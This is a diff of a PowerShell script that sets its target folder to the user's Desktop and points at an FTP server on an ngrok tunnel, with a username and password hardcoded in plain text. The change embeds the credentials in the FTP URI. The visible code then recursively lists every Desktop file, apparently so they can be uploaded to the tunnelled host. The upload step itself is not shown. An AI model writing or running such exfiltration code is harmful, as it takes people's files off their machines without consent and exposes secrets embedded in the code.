@@ -2,13 +2,13 @@
 $Dir="C:\Users\User\Desktop"
  
 #ftp server 
-$ftp = "ftp://0.tcp.ngrok.io:10385//home/dumdumftp/" 
+$ftp = "ftp://dumdumftp:p#}Vck,fayt?ipNqYhy9uzcG@0.tcp.ngrok.io:10385//home/dumdumftp/" 
 $user = "dumdumftp" 
 $pass = "p#}Vck,fayt?ipNqYhy9uzcG"  
- 
+$uri = New-Object System.Uri($ftp)
 $webclient = New-Object System.Net.WebClient 
  
-$webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass)  
+#$webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass)  
  
 #list every file 
 $SrcEntries = Get-ChildItem $Dir -Recurse
